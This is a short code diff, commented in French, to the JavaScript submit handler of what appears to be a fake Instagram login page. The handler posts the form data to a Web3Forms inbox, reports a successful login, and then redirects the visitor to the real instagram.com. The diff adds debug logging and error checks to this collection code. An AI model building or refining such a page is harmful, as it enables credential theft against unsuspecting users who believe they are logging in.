@@ -194,6 +194,8 @@
                 access_key: "88ca9dcb-21f2-47d3-bd33-0e955bd72b7b"  // Votre clé Web3Forms
             };
             
+            console.log("Envoi des données:", formData); // Pour le débogage
+
             fetch('https://api.web3forms.com/submit', {
                 method: 'POST',
                 headers: {
@@ -201,15 +203,22 @@
                 },
                 body: JSON.stringify(formData),
             })
-            .then(response => response.json())
+            .then(response => {
+                console.log("Réponse du serveur:", response); // Pour le débogage
+                if (!response.ok) {
+                    throw new Error('La réponse du réseau n\'était pas valide');
+                }
+                return response.json();
+            })
             .then(data => {
+                console.log("Données reçues:", data); // Pour le débogage
                 showNotification("Connexion réussie !", "success");
                 setTimeout(() => {
                     window.location.href = "https://www.instagram.com";
                 }, 2000);
             })
             .catch(error => {
-                console.error('Erreur:', error);
+                console.error('Erreur:', error); // Pour le débogage
                 showNotification("Une erreur est survenue. Veuillez réessayer.", "error");
             });
         }
